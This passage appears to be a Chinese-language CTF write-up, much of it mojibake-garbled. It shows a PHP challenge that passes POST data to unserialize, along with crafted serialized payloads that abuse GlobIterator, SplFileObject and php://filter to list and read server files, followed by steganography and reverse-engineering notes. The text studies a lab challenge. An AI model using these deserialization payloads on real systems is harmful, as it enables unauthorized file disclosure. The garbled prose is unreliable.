single-quoted-string">'unserialize'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">yigei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">giao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>         <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Givemeanew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un4</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">un0</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//æ­¤å¤„å¯è°ƒç”¨åŸç”Ÿç±»</span>    <span class="token punctuation">&#125;</span>          <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">yigei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your output: '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un4</span><span class="token punctuation">;</span>    <span class="token comment">//è¾“å‡ºå›æ˜¾</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">giao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//è¿·æƒ‘é€‰é¡¹ï¼Œå®é™…ä¸Šæœ¬é¢˜å¹¶ä¸æ˜¯rce</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un2</span><span class="token operator">.</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p> æ€è·¯æ˜¯ï¼Œ</p><p> unserialize()å‡½æ•°æ‰§è¡Œæ—¶ï¼Œä¼šæ‰§è¡Œ_destruct()å‡½æ•°ï¼Œæƒ³åˆ©ç”¨åŸç”Ÿç±»è¯»å–æ–‡ä»¶ï¼Œéœ€è¦æ‰§è¡Œ yigei()å‡½æ•° ï¼Œ å› æ­¤æˆ‘ä»¬è¦æ»¡è¶³ !empty($this-&gt;un0) &amp;&amp; empty($this-&gt;un2) å’Œ $this -&gt; un3 === â€˜unserializeâ€™ ã€‚ è¿™ä¸ªæ¡ä»¶æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ åºåˆ—åŒ–æ¥æ»¡è¶³ã€‚</p><p> ç„¶åæƒ³ç€å¦‚ä½•æ„é€ payloadæ‰èƒ½å¾—åˆ°flagã€‚</p> <pre class="line-numbers language-none"><code class="language-none">æ€è·¯ï¼š 1ï¼š é¦–å…ˆåº”è¯¥å…ˆç”¨å¯éå†ç›®å½•ç±»ï¼Œæ‰¾ä¸€ä¸‹æ–‡ä»¶çš„è·¯å¾„ hint.phpåŠflagçš„è·¯å¾„ï¼Œ 2ï¼š è·¯å¾„ç¡®è®¤ä¹‹åï¼Œå†ç”¨å¯è¯»å–æ–‡ä»¶ç±»ï¼Œæ¥è¯»å–æˆ‘ä»¬åˆšç¡®è®¤è·¯å¾„çš„æ–‡ä»¶ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p>&lt;1&gt;åˆ©ç”¨GlobIteratorç±»æµ‹æ–‡ä»¶è·¯å¾„ã€‚</p><pre><code>    data=O:1:&quot;a&quot;:5:&#123;s:3:&quot;un0&quot;;s:12:&quot;GlobIterator&quot;;s:3:&quot;un1&quot;;s:8:&quot;hint.php&quot;;s:3:&quot;un2&quot;;N;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;s:3:&quot;un4&quot;;N;&#125;</code></pre><p>å¾—åˆ°ä¿¡æ¯ï¼šhint.phpå°±åœ¨å½“å‰ç›®å½•ä¸‹ã€‚  è¿™é‡Œæˆ‘è¯•ç€../flag  ../flag.phpç­‰ç­‰æ‰¾flagï¼Œæ ¹æœ¬æ‰¾ä¸åˆ°ï¼Œä¸€å¤´é›¾æ°´ï¼Œæœ¬æ¥è¿˜ä»¥ä¸ºæ˜¯æˆ‘çš„åŸç”Ÿç±»åˆ©ç”¨é”™äº†ã€‚ã€‚å¸ˆå‚…æé†’æˆ‘è¯»å–ä¸€ä¸‹hint.phpè¯•è¯•ï¼Œå› æ­¤å°±å»æ‰¾ä¸€ä¸‹hint.phpã€‚</p><p>&lt;2&gt; ç¡®å®šæ–‡ä»¶ç›®å½•åï¼Œç”¨SplFileObjectç±»è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚</p><pre><code>    data=O:1:&quot;a&quot;:5:&#123;s:3:&quot;un0&quot;;s:13:&quot;SplFileObject&quot;;s:3:&quot;un1&quot;;s:8:&quot;hint.php&quot;;s:3:&quot;un2&quot;;N;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;s:3:&quot;un4&quot;;N;&#125;</code></pre><p> æ²¡ä»€ä¹ˆå˜åŒ–ï¼Œä½†æ˜¯åœ¨æºç ä¸­å‘ç°äº†  <!--?php--></p><p> ?phpç±»ä¼¼äºä¼ªåè®®ï¼Œå› æ­¤æˆ‘ä»¬ç»§ç»­ç”¨ä¼ªåè®®ï¼Œè¯»å–ä¸€ä¸‹ hint.php. å‘ç° å¯ï¼</p><p>data=O:1:â€aâ€:5:{s:3:â€un0â€;s:13:â€SplFileObjectâ€;s:3:â€un1â€;s:57:â€php://filter/read=convert.base64-encode/resource=hint.phpâ€;s:3:â€un2â€;N;s:3:â€un3â€;s:11:â€unserializeâ€;s:3:â€un4â€;N;}</p><p> å¾—åˆ°äº†flagçš„æç¤ºï¼š</p><?php$a = "flagåœ¨å½“å‰ç›®å½•ä¸‹ä»¥å­—æ¯ f å¼€å¤´çš„ txtæ–‡ä»¶ ä¸­ï¼Œæ— æ³•çˆ†ç ´å‡ºæ¥";åˆ°è¿™é‡Œä¹Ÿå°±çŸ¥é“ï¼Œæ— æ³•çˆ†ç ´å‡ºæ¥ã€Š=ã€‹ä¹‹å‰ç›®å½•éå†flagæ–‡ä»¶çš„æ—¶å€™è¯•äº†å¥½å¤šéƒ½æ²¡å‘ç°ï¼Œå› ä¸ºflagæ‰€åœ¨çš„æ–‡ä»¶åè‚¯å®šæ˜¯çŒœä¸å‡ºæ¥çš„ï¼Œä¸å¸¸è§çš„ã€‚<3> çŸ¥é“flagçš„ç‰¹å¾ä¹‹åï¼Œå›å»åˆ©ç”¨GlobIteratorç±»ï¼Œç”±äº GlobIterator ç±»æ”¯æŒç›´æ¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯è¯´å‡è®¾æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªæ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥ç±»çš„æ¨¡å¼åŒ¹é…æ‰¾åˆ°å…¶å®Œæ•´çš„æ–‡ä»¶åã€‚        data=O:1:"a":5:{s:3:"un0";s:12:"GlobIterator";s:3:"un1";s:6:"f*.txt";s:3:"un2";N;s:3:"un3";s:11:"unserialize";s:3:"un4";N;} å¾—åˆ°flagæ–‡ä»¶åä¸ºï¼šfSSsybePonk_FIndMe.txtçŸ¥é“äº†æ–‡ä»¶åå’Œè·¯å¾„ä¹‹åï¼Œå°±å¯ä»¥åˆ©ç”¨å¯è¯»å–æ–‡ä»¶ç±»SplFileObjectæ¥è¯»å–flagäº†ã€‚        data=O:1:"a":5:{s:3:"un0";s:13:"SplFileObject";s:3:"un1";s:22:"fSSsybePonk_FIndMe.txt";s:3:"un2";N;s:3:"un3";s:11:"unserialize";s:3:"un4";N;}å¾—åˆ°flagï¼š  ä¸Šé¢æ˜¯ä¸€é“è¿ç”¨äº†åŸç”Ÿç±»çŸ¥è¯†çš„ä¾‹é¢˜ï¼Œä¸‹é¢æ¥è®°ä¸€ä¸‹æœ‰å…³çš„çŸ¥è¯†ç‚¹ã€‚å€Ÿé‰´https://blog.csdn.net/qq_51295677/article/details/123859246?spm=1001.2014.3001.5506PHPä¹‹åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼ˆåŸç”Ÿç±»åº”ç”¨ç¯‡sdarrorr0çš„åšå®¢-CSDNåšå®¢_phpåŸç”Ÿç±»ååºåˆ—åŒ–ä¸¤ä½å¸ˆå‚…çš„ä»‹ç»ï¼Œæ•´ç†äº†ä¸‹è‡ªå·±èƒ½çœ‹æ‡‚çš„ç¬”è®°ï¼šSPLä»‹ç»        SPLå°±æ˜¯Standard PHP Libraryçš„ç¼©å†™ã€‚æ®æ‰‹å†Œæ˜¾ç¤ºï¼ŒSPLæ˜¯ç”¨äºè§£å†³å…¸å‹é—®é¢˜(standard problems)çš„ä¸€ç»„æ¥å£ä¸ç±»çš„é›†åˆã€‚æ‰“å¼€æ‰‹å†Œï¼Œæ­£å¦‚ä¸Šé¢çš„å®šä¹‰ä¸€æ ·ï¼Œæœ‰è®¸å¤šå°è£…å¥½çš„ç±»ã€‚å› ä¸ºæ˜¯è¦è§£å†³å…¸å‹é—®é¢˜ï¼Œå…ä¸äº†æœ‰ä¸€äº›å¤„ç†æ–‡ä»¶çš„è¿™é‡Œæ˜¯æ ‡å‡†åº“ï¼šPHP: SPL - ManualPHP åŸç”Ÿæ–‡ä»¶æ“ä½œç±»å¯éå†ç›®å½•ç±»å¯éå†ç›®å½•ç±»åˆ†ä¸ºä¸‹é¢ä¸‰ä¸ªï¼šDirectoryIterator ç±»FilesystemIterator ç±»GlobIterator ç±»1. DirectoryIterator ç±»   DirectoryIterator ç±»æä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£ã€‚è¯¥ç±»çš„æ„é€ æ–¹æ³•å°†ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚DirectoryIterator ç±»ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚å½“æ‰§è¡Œåˆ°echoå‡½æ•°æ—¶ï¼Œä¼šè§¦å‘DirectoryIteratorç±»ä¸­çš„ __toString() æ–¹æ³•ï¼Œè¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç»è¿‡æ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åï¼šä¾‹å¦‚ï¼š<?php$dir=new DirectoryIterator("/");echo $dir;è¿™ä¸ªæŸ¥ä¸å‡ºæ¥ä»€ä¹ˆï¼Œå¦‚æœæƒ³è¾“å‡ºå…¨éƒ¨çš„æ–‡ä»¶åæˆ‘ä»¬è¿˜éœ€è¦å¯¹$dirå¯¹è±¡è¿›è¡Œéå†ï¼š<?php$dir=new DirectoryIterator("/");foreach($dir as $tmp){    echo($tmp.'<br>');    //echo($tmp->__toString().'<br>'); //ä¸ä¸Šå¥æ•ˆæœä¸€æ ·}ä»£ç é‡Œä¸¤ä¸ªè¯­å¥ä¸€æ ·,è¿™ä¹Ÿå°è¯äº†ä¹‹å‰è¯´çš„echoè§¦å‘äº†Directorylterator ä¸­çš„__toString()æ–¹æ³• ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥é…åˆglob://åè®®ä½¿ç”¨æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶è·¯å¾„ï¼š<?php$dir=new DirectoryIterator("glob:///*php*");echo $dir; ä¹Ÿå¯ä»¥é€šè¿‡ç›®å½•ç©¿è¶Šï¼Œç¡®å®šæˆ‘ä»¬å·²çŸ¥çš„æ–‡ä»¶çš„å…·ä½“è·¯å¾„ï¼š<?php$dir=new DirectoryIterator("glob://./././flag.txt");  //ç›®å½•ç©¿è¶Šecho $dir;2. FilesystemIterator ç±»   FilesystemIterator ç±»ä¸ DirectoryIterator ç±»ç›¸åŒï¼Œæä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£ã€‚è¯¥ç±»çš„æ„é€ æ–¹æ³•å°†ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚è¯¥ç±»çš„ä½¿ç”¨æ–¹æ³•ä¸DirectoryIterator ç±»ä¹Ÿæ˜¯åŸºæœ¬ç›¸åŒçš„ï¼š(å­ç±»ä¸çˆ¶ç±»çš„å…³ç³») ä¾‹å¦‚ï¼š`<?php``$dir=new FilesystemIterator("/");``echo $dir;``<?php``$dir=new FilesystemIterator("/");``foreach($dir as $tmp){`    `echo($tmp.'<br>');`    `//echo($f->__toString().'<br>');``}` å°å‘ç°ï¼šç» php_study æµ‹è¯•å‘ç°ï¼Œå¦‚æœ123.phpæ–‡ä»¶åœ¨D://phpstudy_Pro/WWW/ ä¸‹ã€‚æˆ‘ä»¬å¯ç”¨äºç¡®å®šè·¯å¾„çš„æ–‡ä»¶ä¹Ÿå¿…é¡»åœ¨å…¶ä¸­ï¼Œå¦‚D:// æˆ– D://phpstudy_Pro æˆ– D://php_study_Pro/WWW .æˆ‘å‘ç°çš„æ˜¯è¿™æ ·ï¼Œå¦‚æœæœ‰è¯¯çš„è¯å¸Œæœ›å¯ä»¥å¸®å¿™æ”¹æ­£ä¸€ä¸‹ğŸ¤3. GlobIterator ç±»   GlobIterator ç±»ä¹Ÿå¯ä»¥éå†ä¸€ä¸ªæ–‡ä»¶ç›®å½•ï¼Œä½¿ç”¨æ–¹æ³•ä¸å‰ä¸¤ä¸ªç±»ä¹ŸåŸºæœ¬ç›¸ä¼¼ã€‚ä½†ä¸ä¸Šé¢ç•¥ä¸åŒçš„æ˜¯å…¶è¡Œä¸ºç±»ä¼¼äº glob()å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ã€‚ä½¿ç”¨è¿™ä¸ªç±»ä¸éœ€è¦é¢å¤–å†™ä¸Šglob://è¿˜æœ‰ï¼š        Directorylteratorç±» ä¸ FilesystemIterator ç±»å½“æˆ‘ä»¬ä½¿ç”¨echoå‡½æ•°è¾“å‡ºçš„æ—¶å€™ï¼Œä¼šè§¦å‘è¿™ä¸¤ä¸ªç±»ä¸­çš„ __toString() æ–¹æ³•ï¼Œè¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç‰¹å®šæ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ä¸å¾ªç¯éå†çš„è¯æ˜¯ä¸èƒ½çœ‹åˆ°æŒ‡å®šç›®å½•é‡Œçš„å…¨éƒ¨æ–‡ä»¶çš„ã€‚è€ŒGlobIterator ç±»åœ¨ä¸€å®šç¨‹åº¦ä¸Šè§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚ç”±äº GlobIterator ç±»æ”¯æŒç›´æ¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯è¯´å‡è®¾æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªæ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥ç±»çš„æ¨¡å¼åŒ¹é…æ‰¾åˆ°å…¶å®Œæ•´çš„æ–‡ä»¶åã€‚ä¾‹å¦‚ï¼šä¾‹é¢˜é‡Œæˆ‘ä»¬çŸ¥é“äº†flagçš„æ–‡ä»¶åç‰¹å¾ä¸º ä»¥få¼€å¤´çš„.txtæ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ GlobIteratorç±»æ¥æ¨¡å¼åŒ¹é…ï¼š<?php$dir=new GlobIterator("f*txt");echo $dir;å¯è¯»å–æ–‡ä»¶ç±»SplFileObject ç±»SplFileObject ç±»å’Œ SplFileinfoä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œç­‰<?php$dir=new SplFileObject("/flag.txt");echo $dir;?><p> ä½†æ˜¯è¿™æ ·ä¹Ÿåªèƒ½è¯»å–ä¸€è¡Œï¼Œè¦æƒ³å…¨éƒ¨è¯»å–çš„è¯è¿˜éœ€è¦å¯¹æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œå†…å®¹è¿›è¡Œéå†ï¼š</p><?php    $dir = new SplFileObject("/flag.txt");    foreach($dir as $tmp){        echo ($tmp.'<br>');    }?><p>æœ€åï¼Œå½¢å¦‚ï¼š</p><pre><code>echo new $this-&gt;key($this-&gt;value);$this -&gt; a = new $this-&gt;key($this-&gt;value);echo $this-&gt;a;</code></pre><p>æ²¡æœ‰popé“¾çš„æ€è·¯å’Œå¯åˆ©ç”¨ååºåˆ—åŒ–çš„å‡½æ•°ï¼Œä¸€èˆ¬å°±æ˜¯éœ€è¦ç”¨åŸç”Ÿç±»äº†ã€‚</p><p>åªéœ€è¦è®©$this-&gt;keyå€¼èµ‹ä¸ºæˆ‘ä»¬æƒ³ç”¨åŸç”Ÿå‡½æ•°ï¼Œ$this-&gt;valueèµ‹ä¸ºè·¯å¾„ï¼ŒæŸ¥å°±è¡Œäº†ã€‚ä½†æ˜¯è¿™ç§æ„é€ ç±»å‹çš„æ–¹æ³•çš„å±€é™æ€§å°±æ˜¯åªèƒ½æŸ¥ä¸€ä¸ªè·¯å¾„ä¸Šçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œè‘«èŠ¦å¨ƒ42ã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/weixin_63231007/article/details/124740776">https://blog.csdn.net/weixin_63231007/article/details/124740776</a></p><hr><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><blockquote><p>å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡ä¸€ä¸ªåŠ å¯†txtï¼Œå›¾ç‰‡äººå¾€ä¸‹çœ‹ï¼ŒçŒœæµ‹å›¾ç‰‡å¤§å°è¢«ä¿®æ”¹</p></blockquote><h3 id="æ­¥éª¤ï¼š"><a href="#æ­¥éª¤ï¼š" class="headerlink" title="æ­¥éª¤ï¼š"></a>æ­¥éª¤ï¼š</h3><h3 id="1-010çœ‹å®½é«˜ï¼š"><a href="#1-010çœ‹å®½é«˜ï¼š" class="headerlink" title="1.010çœ‹å®½é«˜ï¼š"></a>1.010çœ‹å®½é«˜ï¼š</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">89</span> <span class="token number">50</span> <span class="token number">4</span>E <span class="token number">47</span> <span class="token operator">|</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">03</span> <span class="token class-name">E8</span> <span class="token operator">|</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">01</span> <span class="token number">98</span><span class="token comment">//å‰ä¸¤è¡Œåˆ†åˆ«è¡¨ç¤ºjpgæ ¼å¼ï¼Œå›¾ç‰‡å®½ã€é«˜</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>æŠ¥é”™ï¼š</p><p><code>*ERROR: CRC Mismatch @ chunk[0]; in data: 027db6c8; expected: d11ec80c</code></p></blockquote><h3 id="2-ä¿®æ”¹å®½é«˜ç›¸ç­‰"><a href="#2-ä¿®æ”¹å®½é«˜ç›¸ç­‰" class="headerlink" title="2.ä¿®æ”¹å®½é«˜ç›¸ç­‰"></a>2.ä¿®æ”¹å®½é«˜ç›¸ç­‰</h3><blockquote><p>å‡ºç°äºŒç»´ç å›¾ç‰‡</p></blockquote><h3 id="3-äºŒç»´ç è½¬æ–‡æœ¬â€”â€”-gt-å¾—åˆ°"><a href="#3-äºŒç»´ç è½¬æ–‡æœ¬â€”â€”-gt-å¾—åˆ°" class="headerlink" title="3.äºŒç»´ç è½¬æ–‡æœ¬â€”â€”&gt;å¾—åˆ°"></a>3.äºŒç»´ç è½¬æ–‡æœ¬â€”â€”&gt;å¾—åˆ°</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">\u5728\u8fd9\u6b21\u51ac\u5965\u4f1a\u7684\u821e\u53f0\u4e0a\uff0c\u6211\u56fd\u5c0f\u5c06\u82cf\u7fca\u9e23\u65a9\u83b7\u4e00\u91d1\u4e00\u94f6\uff0c\u90a3\u4f60\u77e5\u9053\u6b64\u6b21\u51ac\u5965\u4f1a\u6211\u56fd\u603b\u5171\u83b7\u5f97\u51e0\u679a\u5956\u724c\u5417\uff1f\u53c8\u5206\u522b\u662f\u51e0\u91d1\u51e0\u94f6\u51e0\u94dc\u5462\uff1f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>è¯¥æ˜¯ä¸€ç§ç¼–ç æ ¼å¼</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/ruoli-s/p/14206145.html#uuencode">CTFå¸¸è§ç¼–ç åŠåŠ è§£å¯†</a></p><p><a href="https://tool.chinaz.com/tools/unicode.aspx">(unicodeè½¬ä¸­æ–‡)</a></p><p>å¾—åˆ°ï¼š<code>åœ¨è¿™æ¬¡å†¬å¥¥ä¼šçš„èˆå°ä¸Šï¼Œæˆ‘å›½å°å°†è‹ç¿Šé¸£æ–©è·ä¸€é‡‘ä¸€é“¶ï¼Œé‚£ä½ çŸ¥é“æ­¤æ¬¡å†¬å¥¥ä¼šæˆ‘å›½æ€»å…±è·å¾—å‡ æšå¥–ç‰Œå—ï¼Ÿåˆåˆ†åˆ«æ˜¯å‡ é‡‘å‡ é“¶å‡ é“œå‘¢ï¼Ÿ</code></p></blockquote><blockquote><p>é‡‘é“¶é“œæŒ‰é¡ºåºè¿æ¥è¯¥æ˜¯æ–‡æœ¬å¯†ç äº†<code>15942</code></p></blockquote><p>å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s?__biz=MzU4OTg4Nzc4MQ==&chksm=fdc7e6e3cab06ff568708281a3803763201d1e019e70fc26b1b6a270fc061daa9427971ce56d&idx=1&mid=2247485097&scene=21&sn=dced33cdc61c10d58579567480eb39ee">BugKu CTF(æ‚é¡¹ç¯‡MISC)â€”éšå†™ (qq.com)</a></p><h2 id="misc2ã€é™ç»´æ‰“å‡»"><a href="#misc2ã€é™ç»´æ‰“å‡»" class="headerlink" title="misc2ã€é™ç»´æ‰“å‡»"></a>misc2ã€é™ç»´æ‰“å‡»</h2><p>é™„ä»¶æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œå±æ€§æ²¡é—®é¢˜(ä¸»è¦æ˜¯çœ‹å›¾ç‰‡å¤§å°)</p><h3 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h3><blockquote><ol><li><p>æ‹–åˆ°010</p></li><li><p>pngæ ¼å¼ï¼Œåˆ†ä¸ºä¸¤æ®µï¼ˆè²Œä¼¼ä¸¤ä¸ªpngåˆæˆä¸€ä¸ªäº†ï¼‰ï¼Œå°†åä¸€æ®µæˆªå–å‡ºæ¥å¦å­˜</p></li><li><p>å¾—åˆ°ä¸€å¼ æ‰“ç å›¾ç‰‡</p></li><li><p>åœ¨kaliä¸­ï¼Œä½¿ç”¨zsteg/foremost/binwolkç›¸å…³è¯­å¥ï¼ŒæŸ¥çœ‹æœ‰æ— æ–‡ä»¶åŒ…å«</p></li><li><p>[zstgeå®‰è£…å‚è€ƒ](<a href="https://www.cnblogs.com/vuclw/p/15887745.html">Kali Linuxä¸‹å®‰è£…zsteg - B0mbax - åšå®¢å›­ (cnblogs.com)</a>)</p></li></ol></blockquote><h3 id="è¡¥å……ï¼š"><a href="#è¡¥å……ï¼š" class="headerlink" title="è¡¥å……ï¼š"></a>è¡¥å……ï¼š</h3><blockquote><p>åŸºäºLSBåŸç†çš„å›¾ç‰‡éšå†™ï¼Œæœ€å¸¸ç”¨å·¥å…·å°±æ˜¯<strong>Stegsolve</strong>ï¼Œä½†æ˜¯è¿‡ç¨‹è¿˜æ˜¯æœ‰äº›ç¼“æ…¢å’Œå¤æ‚ã€‚è€Œzstegï¼Œä¸€ä¸ªç”¨äºæ£€æµ‹PNGå’ŒBMPä¸­çš„éšè—æ•°æ®éšè—æ•°æ®çš„å·¥å…·ï¼Œå¯ä»¥å¿«é€Ÿæå–éšè—ä¿¡æ¯ã€‚</p><p>å‘½ä»¤ï¼š</p><p><code>zsteg -E &quot;b1,bgr,lsb,xy&quot; 2.png &gt;3.png</code> </p><p><code>foremost 2.png</code></p><p>binwalk 2.png</p></blockquote><p>å‚è€ƒ<a href="https://blog.csdn.net/mengmeng0510/article/details/120812017"> kaliä¸­binwalk/foremost/zip2johnå·¥å…·çš„é…åˆä½¿ç”¨_</a></p><h2 id="misc3ã€è—åœ¨æ˜Ÿç©ºé‡Œçš„è¯—"><a href="#misc3ã€è—åœ¨æ˜Ÿç©ºé‡Œçš„è¯—" class="headerlink" title="misc3ã€è—åœ¨æ˜Ÿç©ºé‡Œçš„è¯—"></a>misc3ã€è—åœ¨æ˜Ÿç©ºé‡Œçš„è¯—</h2><p>æ˜Ÿç©ºå›¾ä¸é€æ˜åº¦100%</p><p>flag.txté‡Œè¾¹æŒ‰æ˜Ÿæ˜Ÿè¿çº¿å¾—å¯†ç ï¼ˆç¡®å®winrarï¼‰</p><p>å¯†ç ä¸€ä¸€å¯¹ç…§</p><h2 id="misc4ã€çœŸç›¸åªæœ‰ä¸€ä¸ª"><a href="#misc4ã€çœŸç›¸åªæœ‰ä¸€ä¸ª" class="headerlink" title="misc4ã€çœŸç›¸åªæœ‰ä¸€ä¸ª"></a>misc4ã€çœŸç›¸åªæœ‰ä¸€ä¸ª</h2><blockquote><p>ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><ol><li><p>entity.png</p></li><li><p>flag.txt</p></li><li><p>stream</p></li></ol></blockquote><p>wiresharkä¸­åˆ†æ </p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>ç¨‹åºç»è¿‡è„±å£³æ˜¾ç¤ºä¸º32ä½ï¼Œæ”¾åˆ°IDAä¸­ï¼Œæœ‰ä¸€ä¸ªå¯¹flagçš„åŠ å¯†è¿‡ç¨‹ï¼Œ</p><p>è¿‡ç¨‹åˆ†ä¸ºä¸¤éƒ¨åˆ†åŠ å¯†ï¼Œå°†è¿™ä¸¤ä¸ªè¿‡ç¨‹åå‘è¿˜åŸï¼Œå³å¾—flag</p><h2 id="re3"><a href="#re3" class="headerlink" title="re3"></a>re3</h2><p>ç»è¿‡ä¸€ç³»åˆ—éšç§˜æ“ä½œï¼Œå¾—åˆ°ä¸€ä¸²åè¿›åˆ¶ç </p><blockquote><p>v21 = 1397828937<br>v23 = 1313036669<br>v20 = 1497714515<br>v22 = 1481460802</p><p>v19 = 1127044936<br>v16 = 1230193475<br>v18 = 